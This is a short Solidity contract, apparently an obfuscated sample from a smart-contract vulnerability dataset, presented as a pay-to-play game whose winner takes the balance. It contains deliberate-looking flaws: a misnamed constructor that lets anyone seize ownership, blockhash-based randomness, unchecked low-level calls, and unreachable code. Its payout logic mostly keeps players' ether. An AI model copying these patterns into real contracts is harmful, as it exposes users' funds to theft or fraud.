// winner gets the contract balance
// 0.02 to play

pragma solidity ^0.4.23;

contract FundManager {

//constants

address public _0x08cf08 = 0x0;
address public _0x0c44aa;
address public _0xaba0f7 = 0x461ec7309F187dd4650EE6b4D25D93c922d7D56b;
address public _0xb229d3 = 0x1C3E062c77f09fC61550703bDd1D59842C22c766;
address[] public _0x78c8ba;

mapping(address=>bool) _0x217612;

uint256 public _0x444ce4;
uint256[] public _0x401485 = [951828771,158769871220];
uint256[] public balance;

//constructor

function DranMe() public payable{
        if (false) { revert(); }
        bool _flag2 = false;
	_0x0c44aa = msg.sender;
}

//modifiers

modifier _0x317e83() {
    require(msg.sender == _0x0c44aa);
    _;
}

modifier _0xccc4d4() {
    require(msg.sender == _0x08cf08);
    _;
}

modifier _0x8afee0() {
    require(_0x217612[msg.sender]);
    _;
}

//functions

function _0xf75baa() public constant returns(uint256) {
        uint256 _unused3 = 0;
        if (false) { revert(); }
	return _0x401485.length;
}

function _0x9e84b6(uint256 _0x8969ae) public payable _0x317e83{
	_0x444ce4 = _0x8969ae;
}

function _0x5005f4() public constant returns(uint256) {
	return _0x78c8ba.length;
}

function _0x65a0ba() public constant returns(uint256) {
	return address(this).balance;
}

function _0xf41431() public payable{
	require(msg.value >= 0.02 ether);
	_0x78c8ba.push(msg.sender);
	_0x217612[msg.sender]=true;
}

function _0x3fb62d() public payable _0x8afee0{
	require (msg.value >= 0.01 ether);
	if(msg.sender!=_0x0c44aa || _0xfdcb70()){
	    uint256 _0xae42ee = 0;
        msg.sender.transfer(_0xae42ee);
	}
}

function _0xfdcb70() private returns(bool){
    bytes32 _0x5711b7 = _0xa002c0(blockhash(block.number-1));
    uint256 _0x444ce4 = uint256(_0x5711b7);
        if(_0x444ce4%5==0){
            _0x08cf08 = msg.sender;
            return true;
        }
        else{
            return false;
        }
    }

function _0x084de8 () public payable _0x8afee0 {
	require (msg.value >= 0.005 ether);
	_0xaba0f7.call.value(msg.value)();
}

function _0xc3ddcd () public payable _0x8afee0 {
	require (msg.value >= 0.005 ether);
	_0xb229d3.call.value(msg.value)();
}

function _0x265628 (uint256 _0xad39e9, uint256 _0x45a52d) public payable _0x8afee0 {
	_0x401485[_0xad39e9] = _0x45a52d;
}

function _0x3e2a1d (uint256 _0xb48e50) public payable _0x8afee0 {
	_0x401485.length = _0xb48e50;
}

function _0x8a48a6 (uint256 _0x7b67c4) public payable _0x8afee0 returns(uint256) {
	return (_0x7b67c4 / (_0x401485[0]*_0x401485[1]));
	if((_0x7b67c4 / (_0x401485[0]*_0x401485[1])) == _0x444ce4) {
		_0x0c44aa = _0x08cf08;
	}
}

function _0xf27543 () public payable _0x8afee0 returns(bool) {
    require(msg.value >= 0.01 ether);
    if(msg.value == _0x444ce4){
        return true;
    }
}

function _0x35740f() public payable _0x317e83 {
	_0x0c44aa.call.value(1 wei)();
}

function _0x1937f9() public payable _0xccc4d4 {
	_0x08cf08.transfer(address(this).balance);
}

//fallback function

function() public payable{
	}
}
